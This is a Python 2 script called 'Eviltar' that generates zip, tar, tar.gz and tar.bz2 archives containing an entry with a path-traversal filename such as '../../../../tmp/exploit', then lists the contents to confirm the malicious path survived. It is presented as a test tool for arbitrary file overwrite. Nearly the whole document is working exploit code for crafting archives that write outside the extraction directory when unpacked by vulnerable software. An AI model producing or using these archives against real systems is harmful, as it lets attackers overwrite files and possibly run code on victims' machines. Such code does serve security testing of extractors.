import tarfile
import zipfile
import sys
import os
from argparse import ArgumentParser

def main():
    print 'Eviltar | https://github.com/giuliocomi'
    print 'Full Credits: https://github.com/python/cpython/blob/2.7/Lib/tarfile.py'
    print 'The only goal of this script is to test arbitrary file (over)write via path traversal in Tar archives.'

    parser = ArgumentParser()
    parser.add_argument("-e", "--evilfile", dest="evilfile",
                        help="file to include in the archive", metavar="FILE")
    parser.add_argument("-s", "--safefile", dest="safefile",
                        help="file to include in the archive", metavar="FILE")
    parser.add_argument("-n", "--filename", dest="filename", default=True,
                        help="tampered filename with path traversal pattern (dot-dot)")

    args = parser.parse_args()

    # generate the malicious zip file
    print 'creating archive zip'
    zf = zipfile.ZipFile('evil.zip', 'w')
    zf.write(args.evilfile, args.filename)
    zf.write(args.safefile, str(args.safefile))
    zf.close()

    # generate the malicious tar file
    print 'creating archive tar'
    out = tarfile.open('evil.tar', mode='w')
    try:
        out.add(args.evilfile, args.filename) # example: foo, ../../../../../../../../../tmp/exploit
        out.add(args.safefile, str(args.safefile))
    finally:
        out.close()

    # generate the malicious tar.gz file
    print 'creating archive tar.gz'
    out = tarfile.open('evil.tar.gz', mode='w:gz')
    try:
        out.add(args.evilfile, args.filename) # example: foo, ../../../../../../../../../tmp/exploit
        out.add(args.safefile, str(args.safefile))
    finally:
        out.close()

    # generate the malicious tar.bz2 file
    print 'creating archive tar.bz2'
    out = tarfile.open('evil.tar.bz2', mode='w:bz2')
    try:
        out.add(args.evilfile, args.filename) # example: foo, ../../../../../../../../../tmp/exploit
        out.add(args.safefile, str(args.safefile))
    finally:
        out.close()

    # show that the path traversal filename has been successfully included in the zip file
    print 'Contents of evil.zip:'
    zip = zipfile.ZipFile('evil.zip')
    print zf.namelist()
    zf.close()

    # show that the path traversal filename has been successfully included in the tar file
    print 'Contents of evil.tar:'
    t = tarfile.open('evil.tar', 'r')
    print t.getnames()

    # show that the path traversal filename has been successfully included in the tar.gz file
    print 'Contents of evil.tar.gz:'
    t = tarfile.open('evil.tar.gz', 'r')
    print t.getnames()

    # show that the path traversal filename has been successfully included in the tar.bz2 file
    print 'Contents of evil.tar.bz2:'
    t = tarfile.open('evil.tar.bz2', 'r')
    print t.getnames()

if __name__ == '__main__':
    main()
